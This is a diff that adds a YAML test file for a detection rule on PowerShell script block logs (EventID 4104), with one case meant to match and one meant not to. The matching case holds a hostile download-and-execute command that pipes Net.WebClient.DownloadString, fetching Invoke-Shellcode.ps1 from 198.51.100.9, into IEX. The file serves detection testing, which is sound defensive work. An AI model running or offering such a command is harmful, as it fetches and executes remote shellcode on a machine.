@@ -1,0 +1,20 @@
+rule_id: ac8bdeb0-3414-40ba-a3fc-1abd01d11ee0
+cases:
+  - name: Net.WebClient DownloadString piped to IEX
+    expect: match
+    event:
+      EventID: 4104
+      MessageNumber: 1
+      MessageTotal: 1
+      ScriptBlockId: '1c2d3e4f-5a6b-4c7d-8e9f-0a1b2c3d4e5f'
+      ScriptBlockText: "IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.9/Invoke-Shellcode.ps1')"
+      Path: ''
+  - name: Downloading a file to disk without executing it
+    expect: no_match
+    event:
+      EventID: 4104
+      MessageNumber: 1
+      MessageTotal: 1
+      ScriptBlockId: '2d3e4f5a-6b7c-4d8e-9f0a-1b2c3d4e5f6a'
+      ScriptBlockText: "Invoke-WebRequest -Uri 'https://downloads.contoso.com/agent.msi' -OutFile 'C:\\Temp\\agent.msi'"
+      Path: 'C:\Scripts\Get-Agent.ps1'
